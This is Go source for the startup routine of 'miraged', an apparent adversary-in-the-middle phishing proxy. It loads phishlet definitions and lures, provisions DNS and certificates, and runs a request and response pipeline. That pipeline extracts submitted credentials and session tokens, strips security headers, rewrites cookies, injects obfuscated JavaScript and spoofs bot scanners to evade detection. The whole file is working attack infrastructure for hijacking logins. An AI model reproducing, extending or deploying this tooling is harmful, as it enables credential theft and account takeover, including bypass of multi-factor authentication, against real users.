package main

import (
	"context"
	"fmt"
	"log/slog"
	"os"
	"path/filepath"
	"strings"

	"github.com/travisbale/mirage/internal/aitm"
	"github.com/travisbale/mirage/internal/api"
	"github.com/travisbale/mirage/internal/botguard"
	"github.com/travisbale/mirage/internal/cert"
	"github.com/travisbale/mirage/internal/config"
	"github.com/travisbale/mirage/internal/dns"
	"github.com/travisbale/mirage/internal/events"
	"github.com/travisbale/mirage/internal/obfuscator"
	"github.com/travisbale/mirage/internal/phishlet"
	"github.com/travisbale/mirage/internal/proxy"
	"github.com/travisbale/mirage/internal/proxy/handlers/request"
	"github.com/travisbale/mirage/internal/proxy/handlers/response"
	"github.com/travisbale/mirage/internal/store/sqlite"
)

// Init initialises all subsystems in dependency order. Each step returns an
// error that causes Init to abort immediately — no partial startup.
func (d *Daemon) Init(ctx context.Context) error {
	// Load and validate config.
	cfg, err := loadConfig(d.configPath)
	if err != nil {
		return err
	}
	d.cfg = cfg

	// Open SQLite store.
	db, err := sqlite.Open(cfg.DBPath)
	if err != nil {
		return fmt.Errorf("opening database: %w", err)
	}
	d.db = db

	// Init event bus.
	d.bus = events.NewBus(events.DefaultBufferSize)

	// Load phishlet defs from disk and register them in the resolver.
	d.phishletStore = sqlite.NewPhishletStore(db)
	lureStore := sqlite.NewLureStore(db)
	resolver := aitm.NewPhishletResolver(d.phishletStore, lureStore)
	activeHostnames := &proxy.ActiveHostnameSet{}

	d.loadPhishletDefs(cfg.PhishletsDir, resolver)

	activeCount, zones, err := d.populateActivePhishlets(cfg.ExternalIPv4, activeHostnames)
	if err != nil {
		return err
	}

	// Init DNS providers and service.
	dnsProviders, err := dns.BuildProviders(cfg.DNSProviders, cfg.ExternalIPv4, cfg.DNSPort)
	if err != nil {
		return fmt.Errorf("initializing DNS providers: %w", err)
	}
	d.dnsService = aitm.NewDNSService(dnsProviders, zones, d.bus)

	// Init cert source.
	caDir := filepath.Join(filepath.Dir(cfg.DBPath), "ca")
	certSource, err := cert.NewSource(d.developer, caDir, d.log)
	if err != nil {
		return err
	}

	// Init botguard.
	botGuardSvc, sigDB, err := newBotGuardService(d.bus, sqlite.NewBotStore(db), d.log)
	if err != nil {
		return err
	}

	// Wire services.
	sessionStore := sqlite.NewSessionStore(db)
	d.sessionSvc = &aitm.SessionService{Store: sessionStore, Bus: d.bus}
	lureSvc := &aitm.LureService{Store: lureStore}
	blacklistSvc := aitm.NewBlacklistService(d.bus)

	spoofProxy := proxy.NewSpoofProxy("")
	wsHub := proxy.NewWSHub(d.bus, d.log)

	// Build API handler.
	apiHandler := api.NewRouter(api.RouterDeps{
		Sessions:  d.sessionSvc,
		Lures:     lureSvc,
		Phishlets: d.phishletStore,
		Blacklist: blacklistSvc,
		Botguard:  sigDB,
		Bus:       d.bus,
		Domain:    cfg.Domain,
		Version:   Version,
		Logger:    d.log,
	})

	// Init JS obfuscator — defaults to no-op; upgraded to Node sidecar when enabled.
	d.obfuscator = &obfuscator.NoOpObfuscator{}
	if cfg.Obfuscator.Enabled {
		n, err := obfuscator.NewNodeObfuscator(cfg.Obfuscator, d.log)
		if err != nil {
			d.log.Warn("failed to start Node obfuscator sidecar, falling back to no-op", "error", err)
		} else {
			d.obfuscator = n
		}
	}

	// Build pipeline and proxy.
	pipeline := buildPipeline(pipelineDeps{
		botGuardSvc:      botGuardSvc,
		blacklistSvc:     blacklistSvc,
		sessionSvc:       d.sessionSvc,
		sessionStore:     sessionStore,
		phishletResolver: resolver,
		activeHostnames:  activeHostnames,
		spoofProxy:       spoofProxy,
		bus:              d.bus,
		apiHandler:       apiHandler,
		apiHostname:      cfg.API.SecretHostname,
		obfuscator:       d.obfuscator,
	}, d.log)

	aitmProxy := &proxy.AITMProxy{
		CertSource: certSource,
		Pipeline:   pipeline,
		WSHub:      wsHub,
		Spoof:      spoofProxy,
		Logger:     d.log,
	}
	if cfg.API.SecretHostname != "" {
		clientCA, err := loadOrGenerateCA(cfg.API.ClientCACertPath, d.log)
		if err != nil {
			return err
		}
		if err := issueOperatorCert(clientCA, cfg.API.ClientCACertPath, d.log); err != nil {
			return err
		}
		aitmProxy.SecretHostname = cfg.API.SecretHostname
		aitmProxy.ClientCAs = clientCA.CertPool()
		d.log.Info("API enabled", "hostname", cfg.API.SecretHostname, "ca_cert", cfg.API.ClientCACertPath)
	}
	d.proxy = aitmProxy

	// Start phishlet file watcher. Non-fatal — live reload is optional.
	d.watcher, err = phishlet.NewWatcher(cfg.PhishletsDir, d.bus)
	if err != nil {
		d.log.Warn("phishlet watcher unavailable — live reload disabled", "error", err)
	} else {
		d.phishletReloadSub = events.SubscribeFunc(d.bus, aitm.EventPhishletReloaded, func(ev aitm.Event) {
			if def, ok := ev.Payload.(*aitm.PhishletDef); ok {
				resolver.RegisterDef(def)
			}
		})
		d.watcher.Start()
	}

	d.log.Info("miraged ready",
		"version", Version,
		"domain", cfg.Domain,
		"https_port", cfg.HTTPSPort,
		"api_hostname", cfg.API.SecretHostname,
		"active_phishlets", activeCount,
	)

	return nil
}

// populateActivePhishlets reads all stored phishlet configs and populates
// activeHostnames and DNS zones from the enabled ones. Returns the count of
// enabled phishlets and the zone map for the DNS service.
func (d *Daemon) populateActivePhishlets(externalIP string, activeHostnames *proxy.ActiveHostnameSet) (int, map[string]aitm.ZoneConfig, error) {
	configs, err := d.phishletStore.ListPhishletConfigs()
	if err != nil {
		return 0, nil, fmt.Errorf("listing phishlet configs: %w", err)
	}
	zones := make(map[string]aitm.ZoneConfig)
	activeCount := 0
	for _, pcfg := range configs {
		if !pcfg.Enabled {
			continue
		}
		activeCount++
		if pcfg.Hostname != "" {
			activeHostnames.Add(pcfg.Hostname)
		}
		if pcfg.BaseDomain != "" && pcfg.DNSProvider != "" {
			zones[pcfg.BaseDomain] = aitm.ZoneConfig{
				Zone:         pcfg.BaseDomain,
				ProviderName: pcfg.DNSProvider,
				ExternalIP:   externalIP,
			}
		}
	}
	return activeCount, zones, nil
}

// loadPhishletDefs walks dir and registers all parseable phishlet YAML files
// with the resolver. Parse errors are logged and skipped — non-fatal.
func (d *Daemon) loadPhishletDefs(dir string, resolver *aitm.PhishletResolver) {
	entries, err := os.ReadDir(dir)
	if err != nil {
		d.log.Warn("could not read phishlets directory", "dir", dir, "error", err)
		return
	}
	loader := &phishlet.Loader{}
	for _, entry := range entries {
		if entry.IsDir() {
			continue
		}
		name := strings.ToLower(entry.Name())
		if !strings.HasSuffix(name, ".yaml") && !strings.HasSuffix(name, ".yml") {
			continue
		}
		path := filepath.Join(dir, entry.Name())
		def, err := loader.Load(path)
		if err != nil {
			d.log.Warn("failed to load phishlet", "path", path, "error", err)
			continue
		}
		resolver.RegisterDef(def)
		d.log.Info("loaded phishlet", "name", def.Name)
	}
}

// ── package-level helpers (kept out of Daemon to reduce coupling) ───────────────

func loadConfig(path string) (*config.Config, error) {
	cfg, err := config.Load(path)
	if err != nil {
		return nil, fmt.Errorf("loading config: %w", err)
	}
	if err := cfg.Validate(); err != nil {
		return nil, fmt.Errorf("invalid config: %w", err)
	}
	return cfg, nil
}

func newBotGuardService(bus aitm.EventBus, botStore aitm.BotStore, logger *slog.Logger) (*aitm.BotGuardService, *botguard.JA4SignatureDB, error) {
	bgCfg := botguard.BotGuardConfig{
		Enabled:            false,
		TelemetryThreshold: 0.6,
	}
	sigDB, err := botguard.NewJA4SignatureDB("", bus, logger)
	if err != nil {
		return nil, nil, fmt.Errorf("initialising JA4 signature DB: %w", err)
	}
	scorer := &botguard.Scorer{Cfg: bgCfg, SigDB: sigDB, Logger: logger}
	return &aitm.BotGuardService{Scorer: scorer, Store: botStore, Bus: bus}, sigDB, nil
}

// issueOperatorCert issues a client certificate for the default operator if
// one does not already exist. The cert and key are written alongside the CA
// cert, using the same base path with an "operator" stem.
func issueOperatorCert(ca *api.CA, caCertPath string, logger *slog.Logger) error {
	dir := filepath.Dir(caCertPath)
	certPath := filepath.Join(dir, "operator.crt")
	keyPath := filepath.Join(dir, "operator.key")

	if _, err := os.Stat(certPath); err == nil {
		return nil // already exists
	}

	certPEM, keyPEM, err := ca.IssueClientCert("operator")
	if err != nil {
		return fmt.Errorf("issuing operator client cert: %w", err)
	}
	if err := os.WriteFile(certPath, certPEM, 0644); err != nil {
		return fmt.Errorf("writing operator cert: %w", err)
	}
	if err := os.WriteFile(keyPath, keyPEM, 0600); err != nil {
		return fmt.Errorf("writing operator key: %w", err)
	}
	logger.Info("issued operator client certificate", "cert", certPath, "key", keyPath)
	return nil
}

func loadOrGenerateCA(certPath string, logger *slog.Logger) (*api.CA, error) {
	if _, err := os.Stat(certPath); os.IsNotExist(err) {
		if err := os.MkdirAll(filepath.Dir(certPath), 0750); err != nil {
			return nil, fmt.Errorf("creating CA directory: %w", err)
		}
		ca, err := api.GenerateCA(certPath)
		if err != nil {
			return nil, fmt.Errorf("generating API CA: %w", err)
		}
		logger.Info("generated API client CA", "cert", certPath)
		return ca, nil
	}
	return api.Load(certPath)
}

type pipelineDeps struct {
	botGuardSvc      *aitm.BotGuardService
	blacklistSvc     *aitm.BlacklistService
	sessionSvc       *aitm.SessionService
	sessionStore     aitm.SessionStore
	phishletResolver *aitm.PhishletResolver
	activeHostnames  *proxy.ActiveHostnameSet
	spoofProxy       *proxy.SpoofProxy
	bus              aitm.EventBus
	apiHandler       *api.Router
	apiHostname      string
	obfuscator       scriptObfuscator
}

func buildPipeline(d pipelineDeps, logger *slog.Logger) *proxy.Pipeline {
	req := []proxy.RequestHandler{
		&request.JA4Extractor{},
		&request.BotGuardCheck{Service: d.botGuardSvc, Spoof: d.spoofProxy},
		&request.IPExtractor{},
		&request.BlacklistChecker{Service: d.blacklistSvc, Spoof: d.spoofProxy},
		&request.APIRouter{SecretHostname: d.apiHostname, Handler: d.apiHandler},
		&request.PhishletRouter{ActiveHostnameSet: d.activeHostnames, Resolver: d.phishletResolver, Spoof: d.spoofProxy},
		&request.LureValidator{Spoof: d.spoofProxy},
		&request.SessionResolver{Store: d.sessionStore, Factory: d.sessionSvc},
		&request.TelemetryScoreCheck{Scorer: d.botGuardSvc, Spoof: d.spoofProxy, Threshold: 0.6},
		&request.URLRewriter{},
		&request.CredentialExtractor{Store: d.sessionStore, Bus: d.bus},
		&request.ForcePostInjector{},
	}
	resp := []proxy.ResponseHandler{
		&response.SecurityHeaderStripper{},
		&response.CookieRewriter{},
		&response.SubFilterApplier{},
		&response.TokenExtractor{Store: d.sessionStore, Bus: d.bus, Completer: d.sessionSvc, Whitelist: d.blacklistSvc},
		&response.JSInjector{},
		&response.JSObfuscator{Obfuscator: d.obfuscator, Logger: logger},
	}
	return &proxy.Pipeline{RequestHandlers: req, ResponseHandlers: resp, Logger: logger}
}
